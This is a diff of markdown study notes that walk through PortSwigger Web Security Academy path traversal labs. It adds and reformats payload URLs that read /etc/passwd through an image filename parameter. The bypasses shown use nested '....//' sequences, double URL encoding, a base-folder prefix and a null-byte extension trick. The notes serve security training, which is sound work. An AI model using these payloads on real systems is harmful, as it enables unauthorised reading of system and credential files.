@@ -20,7 +20,10 @@ open the image in another tab so it exposes the parameter that it uses.
 
 parameter name : ```filename```
 
-**payload :**  ```https://0a5e00ed042f6032858d713a008600bf.web-security-academy.net/image?filename=../../../etc/passwd```
+**payload :**  
+```
+https://0a5e00ed042f6032858d713a008600bf.web-security-academy.net/image?filename=../../../etc/passwd
+```
 
 it gives the response but not visible in the browser because the filename parameter is resided inside the ```img html tag``` which cannot
 render text.
@@ -37,7 +40,10 @@ absolute path is allowed we can directly get the output.
 
 ```absolute path``` - reads the ```/``` as the root directory level.
 
-```payload :: https://0a9f000304c9825982999db400a3008f.web-security-academy.net/image?filename=/etc/passwd```
+**payload ::**
+```
+https://0a9f000304c9825982999db400a3008f.web-security-academy.net/image?filename=/etc/passwd
+```
 
 It is currently working in the application directory something like /var/www/html but reads the file path from root.
 
@@ -59,7 +65,10 @@ reads first 3 characters ```...``` and compares ```../```, not matching then go 
 
 above technique is the solution for this lab.
 
-```payload :: https://0a80007c03d6d63f849de3b5009900b4.web-security-academy.net/image?filename=....//....//....//etc/passwd```
+**payload ::**
+```
+ https://0a80007c03d6d63f849de3b5009900b4.web-security-academy.net/image?filename=....//....//....//etc/passwd
+```
 
 
 ### URL encoding of the traversal sequence to bypass input validation filters
@@ -74,6 +83,41 @@ double encoding of ../ - %252e%252e%252f
 
 same like above use ```%252e%252e%252f``` as the replacement of ```../```.
 
-```payload - https://0a7c004504dbc5ca802d762a008900aa.web-security-academy.net/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd```
+**payload ::**
+```
+https://0a7c004504dbc5ca802d762a008900aa.web-security-academy.net/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+```
 
 
+### LAB - 5
+
+**path traversal with validation of start of path**
+
+An application may require the user-supplied filename to start with the expected base folder.
+
+**Payload ::**
+``` 
+https://0af2009c04ca68cc802ea8e900ea008c.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
+```
+
+### Expected file extension
+
+application checks the file extension and allows only some kind of extensions but in general the files we want to exploit will not have
+those type of extension.
+
+**bypass technique ::**
+```
+/etc/passwd  :: /etc/passwd%00.extension
+```
+
+application first checks for the extension and validates and the application, while searching for the file it interpret null byte character
+as end of the line and takes the file name upto ```passwd```.
+
+### LAB - 6
+
+**validation of file extension**
+
+**payload ::**
+```
+https://0ae7008e04afb2ce81a33ed0001c0015.web-security-academy.net/image?filename=../../../etc/passwd%00.jpg
+```
